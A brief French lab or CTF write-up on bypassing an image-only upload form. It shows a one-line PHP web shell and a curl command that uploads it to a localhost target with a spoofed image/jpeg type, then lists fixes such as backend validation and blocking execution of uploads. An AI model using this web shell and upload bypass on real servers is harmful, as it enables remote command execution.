home/ add image

## Comment ?

C'est une page pour upload un fichier mais cela n'accepte que les images.

1. On cree un fichier php pour exécuter des commandes 
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

2. On upload le fichier en le faisant passer pour un fichier de type image/jpeg

curl -s -H "Content-Type: multipart/form-data" \
  -F Upload=Upload \
  -F "uploaded=@shell.php;type=image/jpeg" \
  "http://localhost:8080/index.php?page=upload"


## Comment éviter ? 

- Valider dans le back les fichiers uploadés.
- Limiter les extensions.
- Interdire l'exécution des fichiers uploadés.

